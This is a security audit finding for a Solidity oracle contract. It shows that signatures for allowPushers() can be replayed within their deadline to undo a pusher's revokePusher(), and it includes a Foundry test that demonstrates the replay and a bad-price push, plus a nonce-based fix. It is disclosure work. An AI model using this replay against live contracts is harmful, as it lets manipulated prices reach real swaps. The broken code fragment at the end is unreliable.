### Title
`revokePusher()` self-revocation is silently bypassable via `allowPushers()` signature replay within the deadline window — bad prices continue to reach pool swaps after the pusher attempts to stop — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`CompressedOracleV1.revokePusher()` is documented as giving a pusher the unilateral right to stop their delegation. However, because `allowPushers()` uses a deadline-scoped EIP-191 signature with **no nonce and no one-time-use invalidation**, the creator can replay the exact same signature to silently re-establish the delegation immediately after the pusher revokes it. The pusher's self-revocation right is not unilateral within the deadline window. This is the direct analog of the external bug: a function that is supposed to grant a party control over a critical operation (`revokePusher` ↔ `allowSAFE`) is rendered ineffective because the counterparty can bypass it using a previously-issued credential.

---

### Finding Description

`allowPushers()` verifies a pusher's EIP-191 signature over:

```
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
```

and writes `namespaceRemapping[pusher] = msg.sender` (the creator). [1](#0-0) 

`revokePusher()` clears `namespaceRemapping[msg.sender] = address(0)`. [2](#0-1) 

There is **no nonce, no consumed-signature registry, and no one-time-use mechanism** in `allowPushers()`. The same signature is valid for any number of calls before `deadline` expires. After the pusher calls `revokePusher()`, the creator can immediately call `allowPushers()` again with the identical `(deadline, pushers, signatures)` arguments — the signature still passes `ECDSA.recover`, and `namespaceRemapping[pusher]` is restored to the creator.

The code comment itself acknowledges the risk but misidentifies the deadline as the fix:

> "The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it." [3](#0-2) 

The deadline only limits the *window* of replay — it does not prevent replay within that window. A typical delegation deadline of hours or days gives the creator ample time to re-establish the delegation after every revocation attempt.

The `fallback()` push path resolves the namespace at call time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [4](#0-3) 

So after the creator replays `allowPushers()`, every subsequent push from the pusher's address lands in the creator's namespace again, exactly as if `revokePusher()` had never been called.

---

### Impact Explanation

The `CompressedOracleV1` price path flows directly into pool swaps:

```
fallback() push → namespaceRemapping resolution → slot write
→ getOracleData(feedId) → price(feedId, pool)
→ AnchoredPriceProvider._readLeg() → _computeBidAsk()
→ getBidAndAskPrice() → MetricOmmPool swap execution
``` [5](#0-4) 

If a pusher's key is compromised and the attacker is pushing bad prices into the creator's namespace, the legitimate pusher calls `revokePusher()` to stop the damage. The creator (acting in good faith but unaware of the compromise, or acting maliciously) replays `allowPushers()` with the same signature. The attacker's bad prices continue to flow into the creator's namespace and reach live pool swaps. The `priceGuard` and staleness checks in `_readLeg` are the only downstream defenses, but they only reject prices outside a pre-configured range or with stale timestamps — a compromised pusher pushing plausible-but-wrong prices within the guard range passes all checks.

---

### Likelihood Explanation

- The pusher's key must be compromised (realistic for hot-wallet pushers in production).
- The creator must replay `allowPushers()` — either unknowingly (they have the signature cached and re-submit it thinking the revoke was a mistake) or maliciously.
- The signature is already in the creator's possession from the original delegation setup; no new on-chain action by the pusher is required to enable the replay.
- The deadline window is typically hours to days, giving the creator many opportunities to replay.

---

### Recommendation

Add a per-pusher revocation nonce to the signature domain and increment it on every `revokePusher()` or `removePushers()` call:

```solidity
mapping(address => uint256) public pusherNonce;

// In allowPushers():
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(
        block.chainid, address(this), deadline,
        pusher, msg.sender,
        pusherNonce[pusher]   // <-- bind to current nonce
    ))
);

// In revokePusher() / removePushers():
pusherNonce[pusher]++;        // <-- invalidate all prior signatures
namespaceRemapping[pusher] = address(0);
```

This ensures that any signature issued before a revocation is permanently invalid, making `revokePusher()` truly unilateral.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract RevokePusherBypassTest is Test {
    CompressedOracleV1 oracle;
    uint256 constant PUSHER_KEY = 0xBEEF;
    address pusher;
    address creator = address(0xC0FFEE);

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 0);
        pusher = vm.addr(PUSHER_KEY);
        vm.warp(1_700_000_000);
    }

    function testRevokePusherBypassViaSignatureReplay() public {
        uint256 deadline = block.timestamp + 1 days;

        // 1. Pusher signs consent to creator
        bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, hash);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // 2. Creator establishes delegation
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator, "delegation established");

        // 3. Pusher self-revokes
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0), "revoked");

        // 4. Creator replays the SAME signature — revocation is silently undone
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs); // succeeds with no error
        assertEq(oracle.namespaceRemapping(pusher), creator, "BYPASS: delegation restored after revoke");

        // 5. Pusher's subsequent pushes still land in creator's namespace
        uint56 tsMs = uint56(block.timestamp * 1000);
        uint256 word = (uint256(tsMs) << 8) | uint256(0); // slotId=0
        // pack a bad price into lane 0
        uint48 badPrice = (uint48(0xFFFFFF) << 16) | (uint48(5) << 8) | uint48(5);
        word |= uint256(badPrice) << 208;

        vm.prank(pusher);
        (bool ok,) = address(oracle).call(abi.encodePacked(word));
        assertTrue(ok, "bad price push succeeded");

        // Bad price is now in creator's namespace, feeding pool swaps
        bytes32 feedId = oracle.feedIdOf(creator, 0, 0);
        assertGt(oracle.getOracleData(feedId).price, 0, "bad price in creator namespace");
    }
}
```

    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            );
